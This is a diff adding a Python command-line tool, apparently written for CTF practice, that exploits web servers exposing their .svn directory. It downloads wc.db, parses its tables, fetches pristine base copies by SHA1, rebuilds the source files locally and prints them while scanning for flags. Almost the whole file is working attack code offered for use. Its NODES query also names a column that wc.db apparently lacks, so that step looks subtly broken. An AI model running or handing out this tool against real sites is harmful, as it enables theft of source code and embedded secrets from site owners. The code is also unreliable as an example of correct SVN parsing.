@@ -1,0 +1,199 @@
+#!/usr/bin/env python3
+# svndump -- SVN 泄露自动利用工具（零依赖 stdlib）
+# 用法: svndump <URL> [--out 目录] [--list] [--cat 路径]
+# 功能: 下载 wc.db, 解析条目, 按完整 40 位 sha 下载 pristine 基础副本
+# 注意: pristine 文件名是完整 40 位 sha（不是去掉前2位）！
+# 仓库: /home/a/hackingtools/bin/svndump
+
+import sys, os, sqlite3, urllib.request, urllib.error
+
+if __name__ == '__main__':
+    url = None
+    out = None
+    list_only = False
+    cat_path = None
+    args = sys.argv[1:]
+
+    i = 0
+    while i < len(args):
+        a = args[i]
+        if a == '--out' and i + 1 < len(args):
+            out = args[i + 1]; i += 2
+        elif a == '--list':
+            list_only = True; i += 1
+        elif a == '--cat' and i + 1 < len(args):
+            cat_path = args[i + 1]; i += 2
+        elif a in ('-h', '--help'):
+            print('''svndump -- SVN 泄露自动利用（wc.db 解析 + pristine 下载）
+
+用法:
+  svndump <URL>                 下载 wc.db, 解析, 下载 pristine 文件, cat 出 flag
+  svndump <URL> --out 目录      指定输出目录（默认 svndump_<host>/）
+  svndump <URL> --list          只列出 wc.db 里的文件清单，不下载
+  svndump <URL> --cat 文件名    下载后直接 cat 指定文件
+
+示例:
+  svndump http://目标/.svn
+  svndump http://目标 --list
+  svndump http://目标 --cat flag_1804218695.txt''')
+            sys.exit(0)
+        else:
+            if not url:
+                url = a; i += 1
+            else:
+                print(f'[!] 未知选项: {a}', file=sys.stderr); sys.exit(1)
+
+    if not url:
+        print('用法: svndump <URL> [--out 目录] [--list] [--cat 文件名]', file=sys.stderr)
+        sys.exit(1)
+
+    url = url.rstrip('/')
+    if not url.endswith('.svn'):
+        url += '/.svn'
+    url += '/'
+
+    if out is None:
+        host = url.split('://', 1)[-1].replace('/', '_').replace(':', '_')
+        out = f'svndump_{host}'
+
+    def fetch(path):
+        req = urllib.request.Request(url + path, headers={'User-Agent': 'Mozilla/5.0'})
+        try:
+            with urllib.request.urlopen(req, timeout=10) as r:
+                return r.read()
+        except Exception:
+            return None
+
+    # 1. 下载 wc.db
+    print(f'[*] 目标: {url}')
+    wcdb = fetch('wc.db')
+    if not wcdb or len(wcdb) < 100:
+        print('[!] wc.db 下载失败或文件过小，可能不是 SVN 1.7+'); sys.exit(1)
+    print(f'[*] wc.db: {len(wcdb)} 字节')
+
+    # 判断 format
+    fmt = fetch('format')
+    if fmt:
+        print(f'[*] SVN 格式: {fmt.decode().strip()}')
+
+    # 2. 解析 wc.db（内存模式）
+    tmp = os.path.join('/tmp', '_svndump_wcdb_tmp')
+    with open(tmp, 'wb') as f:
+        f.write(wcdb)
+    conn = sqlite3.connect(tmp)
+    c = conn.cursor()
+
+    # 读取条目
+    entries = []
+    try:
+        c.execute('SELECT path, presence, checksum FROM NODES ORDER BY local_relpath, op_depth DESC')
+        rows = c.fetchall()
+        seen_paths = set()
+        for path, presence, checksum in rows:
+            if path in seen_paths:
+                continue
+            seen_paths.add(path)
+            if presence in ('not-present', 'excluded', 'unversioned', None):
+                continue
+            entries.append((path, presence, checksum))
+    except Exception as e:
+        print(f'[!] NODES 查询失败: {e}')
+
+    # 从 PRISTINE 读 checksum 作为补充
+    pristine_list = []
+    try:
+        c.execute('SELECT checksum FROM PRISTINE')
+        for (cs,) in c.fetchall():
+            if cs and cs not in [e[2] for e in entries if e[2]]:
+                pristine_list.append(cs)
+    except Exception:
+        pass
+
+    conn.close()
+    try:
+        os.unlink(tmp)
+    except Exception:
+        pass
+
+    # 打印条目
+    print(f'[*] 文件条目: {len(entries)}')
+    for path, presence, checksum in entries:
+        cs = (checksum or '').replace('$sha1$', 'sha1$')[:20]
+        print(f'    {path:<40s} {presence:<15s} {cs}')
+
+    if list_only:
+        sys.exit(0)
+
+    # 3. 提取所有 sha（去重）
+    def extract_shas(entries, pristine_list):
+        shas = {}
+        for _, _, cs in entries:
+            if not cs:
+                continue
+            clean = cs.replace('$sha1$', '').replace('sha1$', '').split('!')[0]
+            if len(clean) == 40:
+                shas[clean] = _
+        for cs in pristine_list:
+            if not cs:
+                continue
+            clean = cs.replace('$sha1$', '').replace('sha1$', '').split('!')[0]
+            if len(clean) == 40 and clean not in shas:
+                shas[clean] = None
+        return shas
+
+    # 映射 path → sha
+    path_sha = {}
+    for path, presence, checksum in entries:
+        if checksum:
+            clean = checksum.replace('$sha1$', '').replace('sha1$', '').split('!')[0]
+            if len(clean) == 40:
+                path_sha[path] = clean
+
+    # 补充：从 PRISTINE 表拿额外 sha
+    all_shas = set(path_sha.values())
+    for cs in pristine_list:
+        if cs:
+            clean = cs.replace('$sha1$', '').replace('sha1$', '').split('!')[0]
+            if len(clean) == 40:
+                all_shas.add(clean)
+
+    print(f'[*] 需下载: {len(all_shas)} 个 pristine 文件')
+
+    # 4. 下载所有 pristine
+    os.makedirs(out, exist_ok=True)
+    count = 0
+    downloaded = {}
+
+    for sha in sorted(all_shas):
+        # 注意：文件名是完整 40 位 sha，不是去掉前2位！
+        pristine_path = f'pristine/{sha[:2]}/{sha}.svn-base'
+        data = fetch(pristine_path)
+        if data:
+            downloaded[sha] = data
+            count += 1
+            print(f'    [+] {pristine_path} ({len(data)} B)')
+
+    print(f'[*] 下载完成: {count}/{len(all_shas)}')
+
+    # 5. 按 path 写文件
+    written = 0
+    for path, sha in path_sha.items():
+        if sha in downloaded:
+            dest = os.path.join(out, path)
+            os.makedirs(os.path.dirname(dest) or out, exist_ok=True)
+            with open(dest, 'wb') as f:
+                f.write(downloaded[sha])
+            written += 1
+
+    # 6. 扫描 flag
+    print(f'[+] 写出文件: {written} 个 -> {out}/')
+    print('\n[+] 扫描结果:')
+    for path, sha in path_sha.items():
+        if sha in downloaded:
+            content = downloaded[sha]
+            content_str = content.decode('utf-8', 'replace').strip()
+            print(f'    {path}:')
+            print(f'        {content_str}')
+            if 'ctfhub' in content_str or 'flag' in content_str.lower():
+                print(f'    >>> FLAG <<<')
+    conn.close() if conn else None
